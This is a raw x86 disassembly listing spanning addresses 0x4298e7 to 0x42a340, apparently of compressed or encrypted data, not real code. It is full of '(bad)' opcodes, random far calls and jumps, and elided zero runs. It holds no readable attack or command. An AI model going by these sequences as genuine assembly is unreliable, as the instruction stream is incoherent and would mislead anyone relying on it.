  4298e7:	lock dec ebx
  4298e9:	call   0x56a5:0xa4f8b038
  4298f0:	std    
  4298f1:	add    BYTE PTR [esi+0x6d2eb70c],bh
  4298f7:	(bad)  
  4298f8:	and    al,0x41
  4298fa:	xor    eax,DWORD PTR ds:0x5991c7ed
  429900:	pop    es
  429901:	pushf  
  429902:	sbb    edx,ebx
  429904:	outs   dx,DWORD PTR ds:[esi]
  429905:	fnstcw WORD PTR [esi-0x26]
  429908:	push   ecx
  429909:	cmp    eax,0xc15d409b
  42990e:	inc    ebp
  42990f:	daa    
  429910:	xchg   esp,eax
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	push   esp
  429981:	xchg   BYTE PTR [ebp+0x1bd5fec],ch
  429987:	add    BYTE PTR ds:0x42000001,al
  42998d:	pop    ebx
  42998e:	jecxz  0x429930
  429990:	and    ah,BYTE PTR [ebp+0x52]
  429993:	or     eax,0xc1fb581b
  429998:	xor    BYTE PTR [ebp+eiz*1-0x9],bl
  42999c:	push   es
  42999d:	adc    dh,BYTE PTR [esi+0x5e]
  4299a0:	inc    eax
  4299a1:	and    bh,dh
  4299a3:	cmp    cl,al
  4299a5:	mov    bl,bl
  4299a7:	popa   
  4299a8:	inc    ebp
  4299a9:	xlat   BYTE PTR ds:[ebx]
  4299aa:	nop
  4299ab:	xor    DWORD PTR [edx],esp
  4299ad:	xchg   ecx,eax
  4299ae:	jmp    0xb787afd2
  4299b3:	sbb    BYTE PTR [ebx],ch
  4299b5:	rcr    DWORD PTR [esi],0x89
  4299b8:	imul   ch
  4299ba:	lods   eax,DWORD PTR ds:[esi]
  4299bb:	sub    ah,BYTE PTR [esi+ecx*8]
  4299be:	les    esp,FWORD PTR [esi]
  4299c0:	cmc    
  4299c1:	pusha  
  4299c2:	in     al,dx
  4299c3:	mov    eax,ds:0xbf1c04b0
  4299c8:	inc    esp
  4299c9:	arpl   WORD PTR [edx-0x6f],cx
  4299cc:	imul   ecx,DWORD PTR [esi],0x6e
  4299cf:	lds    esi,FWORD PTR [eax-0x19]
  4299d2:	lahf   
  4299d3:	inc    ecx
  4299d4:	(bad)  [edx-0x5475671c]
  4299da:	sbb    al,0xe2
  4299dc:	das    
  4299dd:	leave  
  4299de:	mov    cl,0xc9
  4299e0:	jp     0x429a52
  4299e2:	push   eax
  4299e3:	inc    ebx
  4299e4:	test   eax,0x3a8b1f72
  4299e9:	push   ds
  4299ea:	das    
  4299eb:	cs pop eax
  4299ed:	pop    esp
  4299ee:	in     al,0xd0
  4299f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299f1:	loop   0x4299d7
  4299f3:	add    DWORD PTR [esi-0x18],edi
  4299f6:	in     eax,dx
  4299f7:	sbb    ebp,DWORD PTR [ebp-0x18acc959]
  4299fd:	outs   dx,BYTE PTR ds:[esi]
  4299fe:	mov    ah,0x1
  429a00:	test   eax,0xca3c1004
  429a05:	(bad)  [edi+esi*1]
  429a08:	rcl    cl,1
  429a0a:	ret    0xed17
  429a0d:	test   DWORD PTR [ebx-0x67],esp
  429a10:	xor    bh,bl
  429a12:	xor    ch,BYTE PTR [esi]
  429a14:	ins    BYTE PTR es:[edi],dx
  429a15:	in     eax,0x13
  429a17:	jecxz  0x429999
  429a19:	gs xchg al,ch
  429a1c:	retf   
  429a1d:	cld    
  429a1e:	xor    BYTE PTR [eax-0x5074b48],0xd3
  429a25:	call   0x7512:0x2d67
  429a2b:	(bad)  
  429a2d:	sti    
  429a2e:	sahf   
  429a2f:	xchg   dh,dl
  429a31:	ss jne 0x429a51
  429a34:	mov    dh,0xbb
  429a36:	call   0x543afd6f
  429a3b:	popa   
  429a3c:	loope  0x429a63
  429a3e:	mov    ebp,DWORD PTR [eax+0x7d832bdb]
  429a44:	pop    esp
  429a45:	ror    DWORD PTR [ecx-0x50],1
  429a48:	jnp    0x4299de
  429a4a:	rcr    BYTE PTR [esi+eax*2-0x8f07cdc],0x9f
  429a52:	lea    ecx,[esi+0x1d]
  429a55:	mov    ds:0x3b07b632,eax
  429a5a:	jns    0x429ad9
  429a5c:	mov    al,ds:0xeb65a63a
  429a61:	jmp    0x4299f5
  429a63:	shl    BYTE PTR [edx+0x1897866d],0x4d
  429a6a:	xchg   edx,eax
  429a6b:	push   0x4765d2bf
  429a70:	inc    ebx
  429a71:	call   0x8cb0:0xe73cd677
  429a78:	jne    0x429a60
  429a7a:	mov    ch,0x52
  429a7c:	xor    al,BYTE PTR [edx]
  429a7e:	jnp    0x429a82
  429a80:	pop    esi
  429a81:	sub    eax,eax
  429a83:	pop    ecx
  429a84:	aad    0x93
  429a86:	dec    ebx
  429a87:	mov    cl,0x36
  429a89:	test   eax,0xe955599b
  429a8e:	pop    ds
  429a8f:	es jnp 0x429a92
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x8ca95667
  429b01:	retf   0x901d
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	add    eax,0x4808feff
  429b11:	shl    DWORD PTR ds:0xaf475ed8,cl
  429b17:	sub    edx,ebx
  429b19:	aas    
  429b1a:	repz sub BYTE PTR [edx-0x2d],ch
  429b1e:	jg     0x429b1c
  429b20:	fst    QWORD PTR [ecx]
  429b22:	dec    esi
  429b23:	or     DWORD PTR [ebp-0x1b892ede],ebx
  429b29:	jmp    0x46942c1e
  429b2e:	mov    ah,0xdc
  429b30:	sahf   
  429b31:	xor    DWORD PTR ds:0x59d3c12,edx
  429b37:	and    al,0xd8
  429b39:	cld    
  429b3a:	push   ebp
  429b3b:	mov    ebp,0xd8685e5
  429b40:	pop    eax
  429b41:	(bad)  
  429b42:	loop   0x429ad4
  429b44:	pop    ds
  429b45:	xor    ecx,DWORD PTR [ebp-0x6b]
  429b48:	xchg   ebx,edx
  429b4a:	addr16 (bad) 
  429b4c:	stc    
  429b4d:	pusha  
  429b4e:	pushf  
  429b4f:	or     al,0xb3
  429b51:	lahf   
  429b52:	mov    ds:0x49b74484,eax
  429b57:	adc    BYTE PTR [edx],bh
  429b59:	adc    al,0x0
  429b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b5c:	jne    0x429b12
  429b5e:	cld    
  429b5f:	pop    esi
  429b60:	nop
  429b61:	out    dx,eax
  429b62:	shl    DWORD PTR [ebx],0x8e
  429b65:	mov    ebx,DWORD PTR ds:0x48261b63
  429b6b:	add    DWORD PTR [edx+ebx*8],esp
  429b6e:	cli    
  429b6f:	dec    edi
  429b70:	sub    al,0x3b
  429b72:	rcl    BYTE PTR [ecx],1
  429b74:	imul   ebx,DWORD PTR [ebp-0x51],0xffffffbd
  429b78:	clc    
  429b79:	pop    eax
  429b7a:	jne    0x429be3
  429b7c:	xchg   esi,eax
  429b7d:	push   ecx
  429b7e:	imul   ebp,DWORD PTR [edi+0x30],0x1b4b6c88
  429b85:	iret   
  429b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b87:	or     al,0xcd
  429b89:	leave  
  429b8a:	arpl   bx,sp
  429b8c:	sub    ebp,DWORD PTR [edx-0x20189e00]
  429b92:	mov    dl,0x87
  429b94:	adc    esi,DWORD PTR [ecx+esi*4-0x1f]
  429b98:	call   0x6e20:0xa62bf648
  429b9f:	aad    0x3a
  429ba1:	xor    eax,0x2dedb3ea
  429ba6:	sbb    edx,DWORD PTR [esi]
  429ba8:	adc    DWORD PTR [ebp+eax*4-0xd],esp
  429bac:	pop    eax
  429bad:	mov    ds:0x7aa42fdc,al
  429bb2:	cwde   
  429bb3:	jo     0x429b7a
  429bb5:	ror    BYTE PTR [ecx-0x68],cl
  429bb8:	sti    
  429bb9:	iret   
  429bba:	addr16 jne 0x429bc5
  429bbd:	and    al,0xb1
  429bbf:	xchg   ecx,eax
  429bc0:	sar    BYTE PTR [esi-0x4fbae92c],0xe0
  429bc7:	mov    edx,esi
  429bc9:	cwde   
  429bca:	xor    al,0xc2
  429bcc:	les    eax,FWORD PTR [edx-0x435fa67]
  429bd2:	mov    WORD PTR [ecx+esi*1-0x79],gs
  429bd6:	mov    es,WORD PTR [eax+0x1ac3c203]
  429bdc:	aam    0xbe
  429bde:	dec    ebp
  429bdf:	ins    DWORD PTR es:[edi],dx
  429be0:	inc    esp
  429be1:	(bad)  
  429be2:	loope  0x429b82
  429be4:	in     al,dx
  429be5:	int    0x3c
  429be7:	stos   DWORD PTR es:[edi],eax
  429be8:	add    ch,cl
  429bea:	push   ebx
  429beb:	mov    al,BYTE PTR ds:0xca7d9a3e
  429bf1:	(bad)  ds:0xddefcf67
  429bf7:	xor    BYTE PTR [ecx+0x3],bh
  429bfa:	sbb    ecx,DWORD PTR [edx+0x7b]
  429bfd:	dec    eax
  429bfe:	jp     0x429c79
  429c00:	or     bh,ch
  429c02:	outs   dx,DWORD PTR ds:[esi]
  429c03:	dec    edi
  429c04:	fstp   TBYTE PTR [edi]
  429c06:	dec    ebx
  429c07:	mov    cl,0x19
  429c09:	(bad)  [edx-0x594e5c2a]
  429c0f:	repz mov ds:0x0,eax
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [esi+0x51],ah
  429c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c83:	shr    DWORD PTR [ecx-0x41],0x1
  429c87:	add    BYTE PTR ds:0x31000001,al
  429c8d:	xor    ah,dh
  429c8f:	(bad)
  429c93:	lods   al,BYTE PTR ds:[esi]
  429c94:	fcomp  QWORD PTR [esi]
  429c96:	cmp    edx,DWORD PTR [eax]
  429c98:	fsub   DWORD PTR [edx-0x48]
  429c9b:	test   BYTE PTR [edx+esi*4+0x55abce80],ah
  429ca2:	fld    QWORD PTR [eax+eiz*4+0x79]
  429ca6:	jnp    0x429cf8
  429ca8:	push   esi
  429ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429caa:	or     DWORD PTR [edx+eiz*4+0x754626c1],ebp
  429cb1:	jmp    0x429d05
  429cb3:	xchg   ebx,eax
  429cb4:	cmp    BYTE PTR [edi-0x47],bh
  429cb7:	mov    esp,0x91105e76
  429cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cbd:	add    eax,0x5d9acbb8
  429cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cc3:	mul    ch
  429cc5:	shr    DWORD PTR [edx],0xee
  429cc8:	pop    esp
  429cc9:	mov    dh,0xc8
  429ccb:	pop    ebx
  429ccc:	ret    0x61db
  429ccf:	push   eax
  429cd0:	sbb    BYTE PTR [ecx],bl
  429cd2:	mov    al,0x60
  429cd4:	sub    al,BYTE PTR [esi-0x1431d45]
  429cda:	je     0x429cb4
  429cdc:	icebp  
  429cdd:	ss cld 
  429cdf:	or     edi,edx
  429ce1:	scas   eax,DWORD PTR es:[edi]
  429ce2:	fcom   DWORD PTR [ebp+esi*4-0x7d]
  429ce6:	shl    BYTE PTR [eax+esi*2+0x3fb78adc],1
  429ced:	clc    
  429cee:	addr16 shl ecx,1
  429cf1:	sub    edx,edi
  429cf3:	adc    eax,0x286599bb
  429cf8:	fidiv  WORD PTR [ebx*2+0x2fe7667a]
  429cff:	mov    WORD PTR [ebp-0x73],?
  429d02:	sub    BYTE PTR [ebx],dh
  429d04:	fcomp  QWORD PTR [ecx-0x21]
  429d07:	cmp    eax,0x65343503
  429d0c:	push   0xf41ec78a
  429d11:	sbb    ah,BYTE PTR [eax-0x7a2d901f]
  429d17:	mov    ds:0x6e8fd738,eax
  429d1c:	push   edi
  429d1d:	push   eax
  429d1e:	mov    ebp,0xd4a471ef
  429d23:	sbb    DWORD PTR [edi-0x35],ebx
  429d26:	mov    WORD PTR [esi-0x486a7b25],fs
  429d2c:	int    0xff
  429d2e:	add    DWORD PTR [edi+0x7569f940],eax
  429d34:	or     eax,0x6c353283
  429d39:	inc    ebp
  429d3a:	jnp    0x429d7d
  429d3c:	mov    ah,0xd2
  429d3e:	cli    
  429d3f:	jmp    0x429dbc
  429d41:	lea    esp,[edi-0x12]
  429d44:	sub    cl,BYTE PTR [esi+0x354d6fda]
  429d4a:	fldcw  WORD PTR [edx-0x2c]
  429d4d:	shr    ebp,cl
  429d4f:	mov    edx,0x123a055a
  429d54:	mov    ebp,0xda9e31a5
  429d59:	add    bl,bl
  429d5b:	inc    ecx
  429d5c:	adc    eax,0x6e8b8989
  429d61:	push   ebp
  429d62:	sbb    DWORD PTR [edi-0x407736c1],edx
  429d68:	je     0x429d3d
  429d6a:	into   
  429d6b:	out    0x2d,al
  429d6d:	and    eax,0xb41fe7c7
  429d72:	je     0x429d1a
  429d74:	push   ebp
  429d75:	loop   0x429db8
  429d77:	sbb    BYTE PTR [edx+0x48ef3836],dh
  429d7d:	lea    ebp,[eax+0x788cfc1d]
  429d83:	mov    ebx,DWORD PTR [ebx+0x2]
  429d86:	aam    0x5
  429d88:	stc    
  429d89:	(bad)  
  429d8a:	in     al,dx
  429d8b:	(bad)  
  429d8d:	das    
  429d8e:	ret    0xd82
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	xchg   ebp,eax
  429e01:	mov    al,ds:0xc06ecee5
  429e06:	add    DWORD PTR [eax],eax
  429e08:	add    eax,0x51000001
  429e0d:	lea    ecx,ds:0x5d228e19
  429e13:	imul   esi,DWORD PTR [eax-0x7a3799ef],0x367b8fa1
  429e1d:	mov    ch,0x29
  429e1f:	imul   esi,DWORD PTR [edx+0x4c7fc317],0xfffffffb
  429e26:	into   
  429e27:	mov    BYTE PTR [ebp-0x115ba742],bl
  429e2d:	sub    BYTE PTR [edx+0x24f5ebfa],dh
  429e33:	call   0x3101:0xa0f98145
  429e3a:	aas    
  429e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e3c:	pop    esi
  429e3d:	xor    bh,cl
  429e3f:	sbb    DWORD PTR [edx],ebp
  429e41:	add    esp,DWORD PTR gs:[ecx+0xfc23bbf]
  429e48:	test   al,0xf8
  429e4a:	inc    edx
  429e4b:	push   cs
  429e4c:	bound  ebx,QWORD PTR [esi-0x1db18fea]
  429e52:	push   ss
  429e53:	frstor [ebx-0x37d2f92c]
  429e59:	enter  0x5d0,0x25
  429e5d:	dec    edx
  429e5e:	xor    eax,DWORD PTR [esi]
  429e60:	pushf  
  429e61:	push   cs
  429e62:	adc    DWORD PTR [eax+ebx*1],edx
  429e65:	aam    0x0
  429e67:	call   ebx
  429e69:	mov    dl,0x81
  429e6b:	pop    es
  429e6c:	xor    esp,esi
  429e6e:	add    esp,DWORD PTR [esi]
  429e70:	push   ds
  429e71:	push   ebx
  429e72:	iret   
  429e73:	mov    bh,0x15
  429e75:	in     eax,0x1d
  429e77:	sub    al,0xe6
  429e79:	int3   
  429e7a:	imul   ebp,esi,0x41
  429e7d:	out    dx,al
  429e7e:	popf   
  429e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e80:	loop   0x429e93
  429e82:	pop    ebp
  429e83:	sbb    dl,BYTE PTR [edi+0x13cce630]
  429e89:	idiv   BYTE PTR [ecx+0x14]
  429e8c:	sbb    al,0xe
  429e8e:	pusha  
  429e8f:	repz xor bl,al
  429e92:	push   0x5e
  429e94:	aad    0x1d
  429e96:	pop    ebx
  429e97:	pcmpeqd mm2,QWORD PTR [esi+0x4e]
  429e9b:	leave  
  429e9c:	pop    ecx
  429e9d:	mov    WORD PTR [edi-0x2f563895],ds
  429ea3:	inc    ebx
  429ea4:	adc    ah,ch
  429ea6:	ins    BYTE PTR es:[edi],dx
  429ea7:	ss ret 0xb067
  429eab:	outs   dx,BYTE PTR ds:[esi]
  429eac:	jae    0x429ec7
  429eae:	push   ebx
  429eaf:	xchg   DWORD PTR [eax-0x6d],edx
  429eb2:	(bad)  
  429eb3:	jne    0x429e6c
  429eb5:	iret   
  429eb6:	(bad)  
  429eb7:	std    
  429eb8:	jo     0x429e71
  429eba:	sub    al,0xce
  429ebc:	out    dx,al
  429ebd:	lock add al,0x50
  429ec0:	rcr    DWORD PTR [ebp-0x2b02300c],1
  429ec6:	cmp    eax,DWORD PTR [ebx-0x26]
  429ec9:	clc    
  429eca:	js     0x429f10
  429ecc:	fidivr DWORD PTR [ebp+eiz*2-0x24f487eb]
  429ed3:	jge    0x429efe
  429ed5:	push   edx
  429ed6:	test   eax,0xdfc6642e
  429edb:	scas   eax,DWORD PTR es:[edi]
  429edc:	mov    bh,0x57
  429ede:	xchg   BYTE PTR [edx+edx*4+0x18],al
  429ee2:	jecxz  0x429f57
  429ee4:	mov    ch,BYTE PTR [ebp+0x73e02dbc]
  429eea:	imul   esi,DWORD PTR [ebp+0x6a],0xffffffc8
  429eee:	pop    edx
  429eef:	push   ebx
  429ef0:	push   edi
  429ef1:	hlt    
  429ef2:	xchg   ebx,eax
  429ef3:	push   0x5f421677
  429ef8:	out    0x60,eax
  429efa:	pop    ebp
  429efb:	xor    ah,BYTE PTR [ebp-0x63adbf9c]
  429f01:	bound  ecx,QWORD PTR [edi]
  429f03:	sub    bh,BYTE PTR [ebp+0x418deada]
  429f09:	or     al,0x45
  429f0b:	and    dh,BYTE PTR [ecx]
  429f0d:	xchg   BYTE PTR [eax],bl
  429f0f:	int    0xec
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x6b2fb912]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x66000001
  429f8d:	jae    0x429f66
  429f8f:	jbe    0x429fa7
  429f91:	add    eax,0x55bad0c0
  429f96:	mov    WORD PTR [esi+0x6c66cb22],ds
  429f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f9d:	mov    ebx,0xdda143b6
  429fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fa3:	ret    0x4cdd
  429fa6:	cmp    eax,0x42c6a739
  429fab:	popf   
  429fac:	push   0xd529f21d
  429fb1:	xchg   esi,eax
  429fb2:	jb     0x429ffb
  429fb4:	mov    DWORD PTR ds:[edx],eax
  429fb7:	inc    ebx
  429fb8:	pop    ebx
  429fb9:	jmp    0x42a017
  429fbb:	jecxz  0x429fee
  429fbd:	mov    esp,0x717b6fb2
  429fc2:	aam    0xda
  429fc4:	call   0xb885f151
  429fc9:	aam    0xca
  429fcb:	or     BYTE PTR [edx+0x2b4eb8eb],dl
  429fd1:	jg     0x429fc0
  429fd3:	inc    ebx
  429fd4:	jno    0x42a009
  429fd6:	gs ja  0x429f9d
  429fd9:	bnd ret 
  429fdb:	cli    
  429fdc:	jno    0x429f98
  429fde:	cmp    BYTE PTR [ebx-0x678ab8b],al
  429fe4:	loopne 0x429fb4
  429fe6:	shl    BYTE PTR [edi],1
  429fe8:	xor    al,0xeb
  429fea:	test   BYTE PTR [ebx+0x7d],dl
  429fed:	out    0xec,al
  429fef:	pop    esi
  429ff0:	or     DWORD PTR [esi-0x40f852a9],0x7998ebe
  429ffa:	(bad)  
  429ffb:	in     al,dx
  429ffc:	out    dx,al
  429ffd:	xor    al,0x41
  429fff:	popa   
  42a000:	(bad)  
  42a001:	push   cs
  42a002:	adc    eax,0xbb350652
  42a007:	mov    ds:0xad8505b5,al
  42a00c:	adc    esi,DWORD PTR [ebp-0x34]
  42a00f:	in     eax,dx
  42a010:	icebp  
  42a011:	push   edx
  42a012:	and    DWORD PTR [ecx+ecx*1],esi
  42a015:	sar    BYTE PTR [eax-0x1b97952b],cl
  42a01b:	cmp    al,0x78
  42a01d:	jecxz  0x42a034
  42a01f:	aad    0xaa
  42a021:	dec    edx
  42a022:	cld    
  42a023:	mov    es,WORD PTR [esp+ebx*8-0x2f]
  42a027:	or     eax,0x7158a6da
  42a02c:	lods   eax,DWORD PTR ds:[esi]
  42a02d:	imul   DWORD PTR [eax]
  42a02f:	dec    eax
  42a030:	pop    ecx
  42a031:	dec    ebx
  42a032:	mov    bl,0xd1
  42a034:	nop
  42a035:	test   esp,edi
  42a037:	sub    eax,0xda802910
  42a03c:	pop    ebp
  42a03d:	cmp    al,0x6a
  42a03f:	fild   WORD PTR [esi]
  42a041:	xor    eax,edi
  42a043:	ret    
  42a044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a045:	or     bl,bl
  42a047:	js     0x42a03a
  42a049:	popa   
  42a04a:	inc    edi
  42a04b:	mov    ebx,0xd55b1f69
  42a050:	test   BYTE PTR [ebp+0x31318609],bh
  42a056:	xchg   esp,eax
  42a057:	push   edi
  42a058:	fwait
  42a059:	xchg   ecx,eax
  42a05a:	cli    
  42a05b:	sbb    DWORD PTR ds:0xa3f04ade,edi
  42a061:	add    eax,0x586e7bec
  42a066:	and    eax,0x61939542
  42a06b:	pop    edx
  42a06c:	out    dx,eax
  42a06d:	lds    ecx,FWORD PTR [edx+edi*1+0x205fdbfa]
  42a074:	add    bh,cl
  42a076:	leave  
  42a077:	aad    0x39
  42a079:	call   eax
  42a07b:	in     al,0x84
  42a07d:	mov    ch,0xb4
  42a07f:	sbb    ecx,esp
  42a081:	add    eax,0xe74943de
  42a086:	inc    edx
  42a087:	mov    bh,0x64
  42a089:	cs (bad) 
  42a08b:	bound  edx,QWORD PTR [eax-0x2c]
  42a08e:	iret   
  42a08f:	push   eax
  42a090:	int3   
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	lods   al,BYTE PTR ds:[esi]
  42a101:	xchg   DWORD PTR es:[edi+0x78],edi
  42a105:	ret    0x1
  42a108:	add    eax,0x54000001
  42a10d:	shl    cl,cl
  42a10f:	xchg   cl,bh
  42a111:	lods   eax,DWORD PTR ds:[esi]
  42a112:	jecxz  0x42a0ec
  42a114:	xor    ah,cl
  42a116:	add    eax,0x32536945
  42a11b:	shl    DWORD PTR ss:[ebx+0x5b],cl
  42a11f:	fist   DWORD PTR [ecx]
  42a121:	sub    eax,ebx
  42a123:	inc    eax
  42a124:	mov    al,0xa8
  42a126:	mov    dl,bl
  42a128:	mov    edi,ecx
  42a12a:	dec    ebp
  42a12b:	paddb  mm6,mm6
  42a12e:	add    al,0xdc
  42a130:	and    DWORD PTR [eax-0x69],eax
  42a133:	add    DWORD PTR [esi-0x78],ebp
  42a136:	popf   
  42a137:	pop    edi
  42a138:	hlt    
  42a139:	cmp    dl,ah
  42a13b:	icebp  
  42a13c:	pop    esp
  42a13d:	mov    ah,0x5
  42a13f:	push   0x1a
  42a141:	in     eax,0x74
  42a143:	sub    eax,0xb446b4f2
  42a148:	inc    ebx
  42a149:	mov    ds:0x6dc13566,al
  42a14e:	cmp    eax,0x4063136f
  42a153:	cmp    BYTE PTR [edx],bh
  42a155:	push   cs
  42a156:	pop    ebp
  42a157:	test   al,0xd4
  42a159:	pop    ebx
  42a15a:	fnsave [eax-0x5f]
  42a15d:	ja     0x42a1cf
  42a15f:	mov    al,ds:0x864385d2
  42a164:	ror    DWORD PTR [edi+0xb],0xbb
  42a168:	outs   dx,BYTE PTR ds:[esi]
  42a169:	dec    edi
  42a16a:	psllq  mm5,0x69
  42a16e:	and    eax,esp
  42a170:	lds    edx,FWORD PTR [eax+0x5ff1841c]
  42a176:	jbe    0x42a1a7
  42a178:	jg     0x42a10c
  42a17a:	aad    0x4
  42a17c:	cmp    eax,0xe71ef4a3
  42a181:	pop    esi
  42a182:	stos   DWORD PTR es:[edi],eax
  42a183:	hlt    
  42a184:	and    DWORD PTR [ebx-0x65],ecx
  42a187:	push   ecx
  42a188:	cmp    al,BYTE PTR [eax]
  42a18a:	popa   
  42a18b:	dec    eax
  42a18c:	int    0xba
  42a18e:	lods   al,BYTE PTR ds:[esi]
  42a18f:	fwait
  42a190:	push   esi
  42a191:	pop    eax
  42a192:	fld    DWORD PTR ds:0xa7460404
  42a198:	fst    QWORD PTR [edi+0x1a]
  42a19b:	and    al,0x3d
  42a19d:	loope  0x42a12f
  42a19f:	mov    bl,0x45
  42a1a1:	add    eax,0x64ffa8df
  42a1a6:	imul   esp,DWORD PTR [eax-0x18],0x305f5c8e
  42a1ad:	cli    
  42a1ae:	adc    eax,0xfc444a23
  42a1b3:	cld    
  42a1b4:	xor    ch,BYTE PTR [ebx]
  42a1b6:	jmp    0x32b8:0xda9e363d
  42a1bd:	mov    dl,0x9d
  42a1bf:	dec    esi
  42a1c0:	pop    ecx
  42a1c1:	outs   dx,DWORD PTR ds:[esi]
  42a1c2:	sbb    BYTE PTR [eax-0x1c70fd7a],cl
  42a1c8:	xor    eax,0x532ffc7d
  42a1cd:	push   edx
  42a1ce:	add    BYTE PTR [ecx],bl
  42a1d0:	lods   al,BYTE PTR ds:[esi]
  42a1d1:	imul   DWORD PTR [eax-0x24]
  42a1d4:	jno    0x42a1dc
  42a1d6:	scas   al,BYTE PTR es:[edi]
  42a1d7:	or     eax,0x3d7c3f91
  42a1dc:	and    DWORD PTR [edi+0x2e9b97a9],ebx
  42a1e2:	ret    0xe793
  42a1e5:	repz fucomip st,st(1)
  42a1e8:	jae    0x42a24a
  42a1ea:	retf   0x873f
  42a1ed:	cld    
  42a1ee:	retf   
  42a1ef:	imul   edi,DWORD PTR [ecx-0x6f53d228],0x7a
  42a1f6:	push   esp
  42a1f7:	imul   ebp,DWORD PTR [ebx+0x8],0x79e51e1d
  42a1fe:	(bad)  
  42a1ff:	pop    ds
  42a200:	mov    ah,0x7
  42a202:	in     al,0x2c
  42a204:	dec    esi
  42a205:	push   es
  42a206:	adc    DWORD PTR [ebx],ebp
  42a208:	push   edi
  42a209:	sbb    al,0xcd
  42a20b:	(bad)  
  42a20c:	or     esi,DWORD PTR [edi+0x67]
  42a20f:	adc    al,0x1a
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fnstcw WORD PTR [edx+0x7d241694]
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0xbb000001
  42a28d:	add    esp,ebp
  42a28f:	mov    ds:0xc01e70a5,eax
  42a294:	call   DWORD PTR [esp+eiz*4+0xb517be4]
  42a29b:	mov    bh,0xc0
  42a29d:	std    
  42a29e:	fimul  WORD PTR [esi+eax*8]
  42a2a1:	cmp    ebx,ecx
  42a2a3:	repz leave 
  42a2a5:	out    0x81,al
  42a2a7:	and    bh,BYTE PTR [esi]
  42a2a9:	inc    edx
  42a2aa:	aaa    
  42a2ab:	(bad)  
  42a2ac:	std    
  42a2ad:	bound  ebp,QWORD PTR [esi]
  42a2af:	fnstcw WORD PTR [esi]
  42a2b1:	test   BYTE PTR ds:0xe26a4d0c,al
  42a2b7:	int    0x4a
  42a2b9:	xchg   edi,eax
  42a2ba:	pusha  
  42a2bb:	loopne 0x42a24f
  42a2bd:	int3   
  42a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2bf:	into   
  42a2c0:	aad    0xf0
  42a2c2:	sub    ebx,DWORD PTR [edi-0x7e]
  42a2c5:	adc    eax,0x11aca54b
  42a2ca:	inc    ebx
  42a2cb:	mov    eax,ds:0xd95891b7
  42a2d0:	fld    QWORD PTR [ebx]
  42a2d2:	cmp    BYTE PTR [edx],ah
  42a2d4:	shr    DWORD PTR [edi+0x6a],1
  42a2d7:	sub    BYTE PTR [esi-0x3b96e66d],ch
  42a2dd:	jmp    0x42a2f5
  42a2df:	cli    
  42a2e0:	pop    ds
  42a2e1:	mov    edx,0x7b8572a1
  42a2e6:	daa    
  42a2e7:	ret    0x1908
  42a2ea:	pop    esi
  42a2eb:	mov    edx,0x5a352f16
  42a2f0:	addr16 js 0x42a356
  42a2f3:	push   es
  42a2f4:	lock push esp
  42a2f6:	pop    ss
  42a2f7:	xor    DWORD PTR cs:[edi],esi
  42a2fa:	and    eax,0x80bb5586
  42a2ff:	jns    0x42a362
  42a301:	mov    esi,0x1454b7b5
  42a306:	xchg   ebp,eax
  42a307:	into   
  42a308:	push   esi
  42a309:	or     BYTE PTR [ebx+0x89b357b],0x11
  42a310:	retf   0xdf49
  42a313:	fldcw  WORD PTR [ecx+ecx*8+0x2c]
  42a317:	jmp    0x4612:0xdb612784
  42a31e:	stc    
  42a31f:	test   BYTE PTR [ebx],bh
  42a321:	iret   
  42a322:	je     0x42a30e
  42a324:	xchg   DWORD PTR [edx-0x58a1153d],ebp
  42a32a:	dec    esp
  42a32b:	pusha  
  42a32c:	fsub   DWORD PTR [ebx+0x22165ea3]
  42a332:	push   ebx
  42a333:	push   edi
  42a334:	jg     0x42a2f3
  42a336:	sbb    eax,0xa2d53a93
  42a33b:	out    0x2b,eax
  42a33d:	das    
  42a33e:	clc    
  42a33f:	xchg   esi,eax
  42a340:	popf   
